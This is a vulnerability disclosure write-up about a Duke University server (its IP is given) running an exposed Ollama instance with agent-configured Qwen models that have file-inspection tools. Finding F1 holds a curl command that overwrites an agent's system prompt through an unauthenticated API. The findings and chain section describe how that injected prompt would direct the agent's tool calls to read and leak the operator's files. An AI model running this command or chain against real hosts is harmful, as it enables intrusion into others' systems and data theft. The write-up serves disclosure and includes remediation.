# Duke University — Unauthenticated Agentic Ollama with File Inspection Tools

_NuClide Research · 2026-05-01_

---

## Summary

Duke University server running Ollama with two agent-configured variants of Qwen 3.6-27B, both with system prompts instructing file-inspection behavior and native function-calling enabled. Raw Ollama port publicly accessible. Model injection via CVE-2025-63389 would silently redirect agent behavior on next workflow invocation.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 152.3.41.179 |
| Org | Duke University |
| Country | US — North Carolina |
| OS | Linux (`/usr/share/ollama/` path) |
| Open ports | 11434 (Ollama — **public**) |

---

## Models

| Model | Size | Notes |
|---|---|---|
| qwen3.6-27b-agent:latest | 16 GB | **Agent — file inspection tools** |
| qwen3.6-27b-agent-128k:latest | 16 GB | **Agent — 128K context, file inspection tools** |
| qwen3.6:27b | 16 GB | Base model |
| hermes3:8b | 4 GB | Local |

---

## Agent Configuration

Both agent models share this system prompt:

```
You are a careful local workflow agent. Prefer using available tools to inspect
files rather than guessing.
Do not overwrite files unless explicitly asked.
```

Modelfile parameters (optimized for deterministic agentic output):
```
RENDERER qwen3.5
PARSER qwen3.5
PARAMETER num_ctx 65536        # 64K context for large file reads
PARAMETER temperature 0.2      # low temperature = consistent tool calls
PARAMETER presence_penalty 1.5
PARAMETER top_k 20
PARAMETER top_p 0.8
```

`RENDERER` and `PARSER` directives enable Ollama's native tool/function-calling. This model is built to generate structured tool-call outputs that an orchestrating framework then executes.

---

## Findings

### F1 — Unauthenticated Agent Model Injection (CRITICAL)

Any actor can overwrite the agent system prompt via CVE-2025-63389:

```bash
curl -X POST http://152.3.41.179:11434/api/create \
  -d '{
    "model": "qwen3.6-27b-agent:latest",
    "from": "qwen3.6-27b-agent:latest",
    "system": "[attacker-controlled instructions]"
  }'
```

Next time the operator's workflow invokes this model, it runs under the injected system prompt. If the workflow executes tool calls emitted by the model (file read, shell, API calls), the injected prompt controls what tools are called and with what arguments.

### F2 — 128K Context Agent as Exfiltration Vector (HIGH)

The 128K context variant is optimized for processing large files. An attacker-controlled system prompt could instruct the agent to include file contents in its responses — readable by any actor watching the orchestration layer.

---

## Chain

```
CVE-2025-63389 model injection (port 11434, no auth)
  → operator's workflow runs agent under attacker prompt
  → model emits attacker-directed tool calls
  → framework executes: file_read, shell, API → operator's filesystem/environment
```

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

---

## Disclosure

- **Discovered:** 2026-05-01
- **Status:** FIXED :)
